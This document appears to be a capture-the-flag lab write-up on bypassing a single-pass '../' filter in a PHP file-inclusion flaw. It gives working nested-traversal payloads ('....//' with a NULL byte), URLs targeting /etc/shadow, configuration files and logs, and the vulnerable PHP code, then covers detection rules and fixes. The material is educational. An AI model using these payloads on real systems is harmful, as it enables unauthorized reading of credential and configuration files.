# Lab 8: LFI with Input Validation Bypass - Double Encoding

## Objective
Bypass input validation filters that remove directory traversal sequences (`../`). Learn how to exploit incomplete filtering mechanisms using double encoding and recursive patterns.

## Lab Description
In this lab, the developer has implemented input validation to prevent directory traversal attacks. The application actively removes `../` sequences from user input. However, this filtering mechanism is **incomplete** and can be bypassed.

**Target URL:**
```
http://webapp.thm/index.php?lang=EN
```

## Understanding the Defense Mechanism

### What the Developer Implemented

The developer added a filter to remove directory traversal patterns:

```php
<?php
$lang = $_GET['lang'];

// Security filter - remove ../ patterns
$lang = str_replace('../', '', $lang);

include("languages/" . $lang . ".php");
?>
```

**Filter Behavior:**
- Scans input for `../` patterns
- Replaces all instances with empty string
- Appears to prevent path traversal
- But has a **critical flaw**!

### Testing the Filter

**Attempt:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

**Error Message:**
```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

### Analyzing the Error

**Key Observation:**
```
include(languages/etc/passwd)
```

**What Happened:**
1. User Input: `../../../../etc/passwd`
2. Filter Applied: All `../` removed
3. Result: `etc/passwd`
4. Final Path: `languages/etc/passwd`

**Analysis:**
✅ Filter is working - it removed `../`
❌ But the filter is **incomplete**
❌ It only does **ONE pass** through the input
❌ This creates a bypass opportunity!

## The Vulnerability: Single-Pass Filtering

### Why Single-Pass Filtering Fails

**The Problem:**
```php
str_replace('../', '', $input)
```

This function:
1. Searches for the pattern `../`
2. Replaces each occurrence with empty string
3. **Stops after one pass**
4. Does NOT re-scan the modified string

### The Bypass: Nested Encoding

**If the filter only removes `../` once, what if we hide `../` inside itself?**

## The Double Encoding Bypass

### Concept: Nested Directory Traversal

**Basic Idea:**
- Place `../` **inside** another `../`
- When the filter removes the inner `../`, it **recreates** the outer `../`
- The reconstructed `../` survives the filter!

### Visual Representation

**Payload Structure:**
```
....//
```

**Breakdown:**
- `..` (part 1)
- `../` (this gets removed)
- `/` (part 2)

**After Filter Removes `../`:**
- `..` + `/` = `../`
- **The pattern is recreated!**

### Step-by-Step Transformation

```
Original Input:
....//

Filter searches for:
../

First match found:
....//
  ^^^
  This part matches and gets removed

After removal:
....// - ../ = ../

Result:
../  ← Successfully bypassed!
```

### Complete Visual Example

```
Before Filter:              ....//....//....//....//etc/passwd
                            └─┬─┘ └─┬─┘ └─┬─┘ └─┬─┘
                            These contain ../

Filter removes ../
from each group:            .. / .. / .. / .. /etc/passwd
                            └─┬──┘└─┬──┘└─┬──┘└─┬──┘
                            
After filter:               ../../../../etc/passwd

                            ✅ Path traversal reconstructed!
```

## Complete Exploit

### The Payload

```
....//....//....//....//etc/passwd
```

**Why 4 levels?**
- Application path: `/var/www/html/THM-5/`
- Need to traverse: `THM-5/` → `html/` → `www/` → `var/` → `/` (root)
- Each `....//` becomes `../` after filtering

### Full URL

```
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd
```

### What Happens Behind the Scenes

```
Step 1: User Input
lang=....//....//....//....//etc/passwd

Step 2: Filter Applied (str_replace)
Input:  ....//....//....//....//etc/passwd
Search: ../
Remove: All instances of ../

Process each ....//:
....// → remove ../ from middle → ../

Result: ../../../../etc/passwd

Step 3: Include Function
include("languages/" . "../../../../etc/passwd" . ".php");
= include("languages/../../../../etc/passwd.php");

Step 4: Path Resolution
/var/www/html/THM-5/languages/../../../../etc/passwd.php
→ /var/www/html/THM-5/../../../../etc/passwd.php
→ /etc/passwd.php (doesn't exist, need NULL byte!)

Step 5: Add NULL Byte
....//....//....//....//etc/passwd%00
→ ../../../../etc/passwd%00
→ /etc/passwd ✅
```

## Detailed Breakdown of the Pattern

### Understanding `....//`

Let's dissect this pattern character by character:

```
Character Position:  1 2 3 4 5 6
Pattern:            . . . . / /
                    └─┬─┘ └┬┘└┘
                      |    |  |
                    First  |  Second slash
                    two    Third slash forms
                    dots   ../ when middle
                           removed
```

**How Filter Sees It:**
```
....//
  ↓
Searches for ../
  ↓
Finds: ../ (positions 3-5)
  ↓
Removes positions 3-5
  ↓
Remaining: .. + / (positions 1-2 + 6)
  ↓
Result: ../
```

### Multiple Levels

**For 1 level:**
```
....// → ../
```

**For 2 levels:**
```
....//....// → ../../
```

**For 3 levels:**
```
....//....//....// → ../../../
```

**For 4 levels (our case):**
```
....//....//....//....// → ../../../../
```

## Alternative Bypass Patterns

### Pattern 1: Different Nesting

```
..././..././..././..././
```

**How it works:**
```
..././
  ↓
Remove ../
  ↓
../
```

### Pattern 2: Mixed Encoding

```
....\/....\/....\/....\/
```

**Note:** Depends on how the application handles backslashes

### Pattern 3: Triple Nesting

```
......///
```

**How it works:**
```
......///
  ↓
Remove first ../
  ↓
...///
  ↓
Remove second ../ (if filter ran again)
  ↓
../
```

**But remember:** Single-pass filter, so double nesting is sufficient!

## Complete Lab Walkthrough

### Step 1: Test Direct Path Traversal (Blocked)

**Attempt:**
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

**Error:**
```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory
```

**Analysis:**
- Input: `../../../../etc/passwd`
- After filter: `etc/passwd`
- All `../` removed ❌

### Step 2: Apply Double Encoding

**Payload:**
```
....//....//....//....//etc/passwd
```

**URL:**
```
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd
```

**What Filter Does:**
```
Input:  ....//....//....//....//etc/passwd
Output: ../../../../etc/passwd
```

**Result:** ✅ Path traversal restored!

### Step 3: Handle File Extension

If the application still appends `.php`, use NULL byte:

**Complete Payload:**
```
....//....//....//....//etc/passwd%00
```

**URL:**
```
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd%00
```

### Step 4: Verify Success

**Expected Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

**Status:** ✅ Successfully bypassed the filter!

## Why This Works: The Single-Pass Problem

### The Flaw in str_replace()

```php
// Developer's code:
$input = str_replace('../', '', $input);
```

**What str_replace() does:**
1. Scans the string from left to right
2. Finds all occurrences of the search string
3. Replaces them with the replacement string
4. **Returns the result** (does not re-scan)

### One-Pass vs Multi-Pass Filtering

**One-Pass (Current Implementation):**
```php
$input = "....//";
$input = str_replace('../', '', $input);
// Result: "../"
// Only ONE pass, doesn't check again
```

**Multi-Pass (Secure Implementation):**
```php
while (strpos($input, '../') !== false) {
    $input = str_replace('../', '', $input);
}
// Keeps removing until no ../ remains
```

### Comparison

| Approach | Input | After 1st Pass | After 2nd Pass | Final Result |
|----------|-------|---------------|----------------|--------------|
| **Single-Pass** | `....//` | `../` | *(no 2nd pass)* | `../` ✅ Bypass works |
| **Multi-Pass** | `....//` | `../` | `` | `` ❌ Bypass fails |

## Other Targets to Test

### System Files (with double encoding)

```
# Password file
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd%00

# Shadow file (if accessible)
http://webapp.thm/index.php?lang=....//....//....//....//etc/shadow%00

# Host file
http://webapp.thm/index.php?lang=....//....//....//....//etc/hosts%00

# System info
http://webapp.thm/index.php?lang=....//....//....//....//etc/issue%00

# Apache config
http://webapp.thm/index.php?lang=....//....//....//....//etc/apache2/apache2.conf%00

# Application config
http://webapp.thm/index.php?lang=....//....//....//....//var/www/html/config.php%00
```

### Web Application Files

```
# Database config
http://webapp.thm/index.php?lang=....//....//....//....//var/www/html/THM-5/config.php%00

# Index file (source code)
http://webapp.thm/index.php?lang=....//....//....//....//var/www/html/THM-5/index.php%00

# Logs
http://webapp.thm/index.php?lang=....//....//....//....//var/log/apache2/access.log%00
```

## Advanced Bypass Techniques

### Technique 1: Combining with Other Bypasses

```
# Double encoding + Current directory
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd/.

# Double encoding + NULL byte
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd%00

# Triple nesting
http://webapp.thm/index.php?lang=......///......///......///......///etc/passwd%00
```

### Technique 2: URL Encoding the Payload

```
# URL encode the dots
http://webapp.thm/index.php?lang=%2e%2e%2e%2e%2f%2f

# Double URL encoding
http://webapp.thm/index.php?lang=%252e%252e%252e%252e%252f%252f
```

### Technique 3: Backslash Variations

```
http://webapp.thm/index.php?lang=....\\....\\....\\....\\etc\passwd

# Or mixed
http://webapp.thm/index.php?lang=....//....\\....//....\\etc/passwd
```

## Detection and Prevention

### How to Detect This Attack

**Log Analysis:**
```
# Look for repeated patterns
192.168.1.100 - "GET /index.php?lang=....//....//....// HTTP/1.1"
192.168.1.100 - "GET /index.php?lang=..././..././ HTTP/1.1"

# Unusual character sequences
....//
..././
......///
```

**WAF Rules:**
```
# Detect double-encoded traversal
SecRule ARGS "@rx \.\.\.\./" "id:1,deny"
SecRule ARGS "@rx \.\.//\.\.//" "id:2,deny"
SecRule ARGS "@rx (\.\.){2,}" "id:3,deny"
```

### Proper Prevention: Recursive Filtering

**Insecure (Current):**
```php
<?php
// One pass only - VULNERABLE
$input = str_replace('../', '', $input);
?>
```

**Better (Multi-Pass):**
```php
<?php
// Keep removing until no ../ remains
while (strpos($input, '../') !== false) {
    $input = str_replace('../', '', $input);
}
?>
```

**Best (Whitelist):**
```php
<?php
// Only allow pre-approved values
$allowed = ['EN', 'FR', 'ES', 'DE'];

if (in_array($_GET['lang'], $allowed)) {
    include("languages/" . $_GET['lang'] . ".php");
} else {
    die("Invalid language");
}
?>
```

### Additional Security Measures

**1. Use basename():**
```php
<?php
$lang = basename($_GET['lang']);
include("languages/" . $lang . ".php");
?>
```

**2. Regex Validation:**
```php
<?php
if (preg_match('/^[a-zA-Z0-9]+$/', $_GET['lang'])) {
    include("languages/" . $_GET['lang'] . ".php");
} else {
    die("Invalid input");
}
?>
```

**3. Realpath() Validation:**
```php
<?php
$base_dir = realpath('languages/');
$file = realpath('languages/' . $_GET['lang'] . '.php');

// Ensure file is within allowed directory
if (strpos($file, $base_dir) === 0 && file_exists($file)) {
    include($file);
} else {
    die("Access denied");
}
?>
```

**4. open_basedir Configuration:**
```ini
; In php.ini
open_basedir = /var/www/html/
```

## Understanding the Complete Attack Chain

### Attack Flow Diagram

```
┌─────────────────────────────────────┐
│  Attacker Input                     │
│  ....//....//....//....//etc/passwd │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  Application Receives                │
│  $_GET['lang'] = "....//....//..."  │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  Filter Applied (str_replace)        │
│  Remove all ../                      │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  Result After Filtering              │
│  ../../../../etc/passwd              │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  Include Function                    │
│  include("languages/../../..")       │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  Path Traversal                      │
│  /var/www/html/THM-5/languages/..    │
│  → /etc/passwd                       │
└──────────────┬──────────────────────┘
               ↓
┌─────────────────────────────────────┐
│  File Included                       │
│  Contents displayed to attacker      │
└─────────────────────────────────────┘
```

## Real-World Examples

### Why This Matters

**Real Vulnerabilities:**
- Many applications use `str_replace()` for sanitization
- Developers often forget about nested encoding
- Single-pass filters are surprisingly common
- Legacy code often has this vulnerability

**Impact:**
- Source code disclosure
- Configuration file access
- Database credential exposure
- System file reading
- Potential for RCE (via log poisoning)

### Historical Examples

Similar vulnerabilities have been found in:
- WordPress plugins (early versions)
- Custom CMS systems
- Legacy PHP applications
- File upload handlers
- Template engines

## Testing Strategy

### Systematic Testing Approach

**1. Identify the filter:**
```
Test: ../../../../etc/passwd
Result: etc/passwd
Conclusion: ../ is being removed
```

**2. Test double encoding:**
```
Test: ....//....//....//....//etc/passwd
Result: ../../../../etc/passwd (filter bypassed!)
Conclusion: Single-pass filter confirmed
```

**3. Count directory levels:**
```
Error shows: /var/www/html/THM-5/
Levels: 4
Required: ....//....//....//....//
```

**4. Handle file extension:**
```
Add: %00 (NULL byte)
Final: ....//....//....//....//etc/passwd%00
```

**5. Execute and verify:**
```
Access the URL
Check for file contents
Success: /etc/passwd displayed
```

## Key Takeaways

1. **Single-pass filters are vulnerable** - Always re-scan after replacement
2. **Nested encoding bypasses weak filters** - `....//` becomes `../` after filtering
3. **str_replace() alone is insufficient** - Use loops or better validation
4. **Whitelisting is always better** - Don't try to blacklist all bad inputs
5. **Defense in depth** - Use multiple security layers
6. **Test your filters** - Try to bypass your own security
7. **NULL bytes still matter** - Often needed to bypass extension appending

## Common Mistakes

1. **Using the wrong number of levels** - Count directory depth carefully
2. **Forgetting NULL byte** - Needed to bypass `.php` appending
3. **Not URL encoding** - Browser might not handle `%00` correctly
4. **Wrong pattern** - Must be `....//` not `..../` or `...//`
5. **Testing on wrong PHP version** - NULL byte only works < 5.3.4

## Testing Checklist

- [x] Test direct path traversal (confirm filter exists)
- [x] Analyze error message for filter behavior
- [x] Calculate required directory depth
- [x] Craft double-encoded payload: `....//` × depth
- [x] Add target file path: `/etc/passwd`
- [x] Add NULL byte if needed: `%00`
- [x] Test the complete payload
- [x] Verify file contents are displayed
- [x] Try other sensitive files
- [x] Document successful payloads

## Lab Solution Summary

**Problem:**
- Application removes `../` from input
- Direct path traversal blocked

**Solution:**
- Use nested encoding: `....//`
- Filter removes inner `../`, leaving `../`
- Successful bypass!

**Complete Payload:**
```
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd%00
```

**Result:**
- Filter applied: `....//` → `../`
- Path traversal works: `../../../../etc/passwd`
- File accessed successfully ✅

## Status
✅ **Lab Completed** - Successfully bypassed input validation using double-encoded path traversal sequences